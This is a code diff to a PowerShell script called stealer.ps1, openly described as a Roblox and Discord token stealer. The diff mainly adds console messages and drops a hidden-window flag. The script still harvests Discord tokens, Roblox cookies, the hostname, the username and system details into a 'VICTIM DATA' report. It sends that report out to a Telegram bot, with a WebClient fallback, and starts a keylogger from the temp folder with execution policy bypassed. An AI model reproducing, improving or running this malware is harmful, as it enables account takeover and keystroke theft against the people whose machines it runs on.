@@ -1,5 +1,6 @@
 # stealer.ps1 — Roblox/Discord token stealer
 # Sends to Telegram via Invoke-RestMethod with error logging
+# VISIBLE VERSION - no hidden execution
 
 [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
 
@@ -11,6 +12,7 @@ function Write-Log {
     param([string]$Msg)
     $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
     "$timestamp - $Msg" | Out-File -FilePath $logFile -Append -Encoding UTF8
+    Write-Host $Msg
 }
 
 function Send-Telegram {
@@ -23,8 +25,10 @@ function Send-Telegram {
             parse_mode = "HTML"
         } -ErrorAction Stop
         Write-Log "[Telegram] SUCCESS - Message ID: $($response.result.message_id)"
+        Write-Host "[Telegram] Message sent OK" -ForegroundColor Green
     } catch {
         Write-Log "[Telegram] FAILED: $($_.Exception.Message)"
+        Write-Host "[Telegram] FAILED: $($_.Exception.Message)" -ForegroundColor Red
         # Try WebClient fallback
         try {
             $body = "chat_id=$chatId&text=$([Uri]::EscapeDataString($Message))"
@@ -32,8 +36,10 @@ function Send-Telegram {
             $wc.Headers.add("Content-Type", "application/x-www-form-urlencoded")
             $result = $wc.UploadString("https://api.telegram.org/bot$botToken/sendMessage", $body)
             Write-Log "[Telegram] WebClient fallback: $result"
+            Write-Host "[Telegram] Sent via WebClient fallback" -ForegroundColor Green
         } catch {
             Write-Log "[Telegram] WebClient FAILED: $($_.Exception.Message)"
+            Write-Host "[Telegram] WebClient FAILED: $($_.Exception.Message)" -ForegroundColor Red
         }
     }
 }
@@ -59,7 +65,7 @@ function Get-DiscordToken {
                         Write-Log "[Discord] Found token: $($match.Value.Substring(0,30))..."
                     }
                 } catch {
-                    Write-Log "[Discord] Error reading $($_.FullName): $($_.Exception.Message)"
+                    Write-Log "[Discord] Error reading: $($_.Exception.Message)"
                 }
             }
         }
@@ -83,12 +89,19 @@ function Get-RobloxCookie {
 }
 
 # Main execution
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host "  STEALER MODULE - RUNNING" -ForegroundColor Cyan
+Write-Host "========================================" -ForegroundColor Cyan
+Write-Host ""
+
 Write-Log "[*] stealer.ps1 started"
 $hostname = $env:COMPUTERNAME
 $username = $env:USERNAME
 $timestamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
 
 Write-Log "[*] Host: $hostname, User: $username"
+Write-Host "[*] Host: $hostname | User: $username" -ForegroundColor Cyan
 
 $report = "<b>[+] VICTIM DATA</b>`n"
 $report += "Host: <code>$hostname</code>`n"
@@ -96,9 +109,11 @@ $report += "User: <code>$username</code>`n"
 $report += "Time: <code>$timestamp</code>`n`n"
 
 # Discord tokens
+Write-Host "[*] Scanning for Discord tokens..." -ForegroundColor Yellow
 Write-Log "[*] Scanning for Discord tokens..."
 $discordTokens = Get-DiscordToken
 if ($discordTokens) {
+    Write-Host "[+] Found $($discordTokens.Count) Discord tokens!" -ForegroundColor Green
     Write-Log "[*] Found $($discordTokens.Count) Discord tokens"
     $report += "<b>DISCORD TOKENS:</b>`n"
     foreach ($token in $discordTokens) {
@@ -110,6 +125,7 @@ if ($discordTokens) {
 }
 
 # Roblox indicators
+Write-Host "[*] Scanning for Roblox cookies..." -ForegroundColor Yellow
 Write-Log "[*] Scanning for Roblox cookies..."
 $robloxData = Get-RobloxCookie
 if ($robloxData) {
@@ -123,6 +139,7 @@ if ($robloxData) {
 }
 
 # System info
+Write-Host "[*] Collecting system info..." -ForegroundColor Yellow
 Write-Log "[*] Collecting system info..."
 $report += "`n<b>SYSTEM:</b>`n"
 try {
@@ -133,27 +150,38 @@ try {
     $report += "CPU: $cpu`n"
     $report += "RAM: $ram GB`n"
     Write-Log "[System] OS: $os, RAM: $ram GB"
+    Write-Host "[+] OS: $os | RAM: $ram GB" -ForegroundColor Cyan
 } catch {
     $report += "System info: Error - $($_.Exception.Message)`n"
     Write-Log "[System] Error: $($_.Exception.Message)"
 }
 
 # Send report to Telegram
+Write-Host "[*] Sending report to Telegram..." -ForegroundColor Yellow
 Write-Log "[*] Sending report to Telegram..."
 Send-Telegram -Message $report
 
 # Start keylogger as background job
+Write-Host "[*] Starting keylogger..." -ForegroundColor Yellow
 $keyloggerPath = "$env:TEMP\keylogger.ps1"
 if (Test-Path $keyloggerPath) {
-    Write-Log "[*] Starting keylogger job..."
     Start-Job -ScriptBlock {
         param($path)
-        powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File $path
+        powershell.exe -ExecutionPolicy Bypass -File $path
     } -ArgumentList $keyloggerPath | Out-Null
     Write-Log "[*] Keylogger job started"
+    Write-Host "[+] Keylogger started" -ForegroundColor Green
 } else {
     Write-Log "[-] Keylogger not found at $keyloggerPath"
+    Write-Host "[-] Keylogger not found" -ForegroundColor Red
 }
 
 Write-Log "[*] stealer.ps1 finished"
-Write-Host "SUCCESS" -ForegroundColor Green
+Write-Host ""
+Write-Host "========================================" -ForegroundColor Green
+Write-Host "           SUCCESS" -ForegroundColor Green -BackgroundColor Black
+Write-Host "========================================" -ForegroundColor Green
+Write-Host ""
+Write-Host "[*] Press any key to close..." -ForegroundColor Yellow
+$null = $Host.UI.RawUI.ReadKey("NoEcho,IncludeKeyDown")
+exit
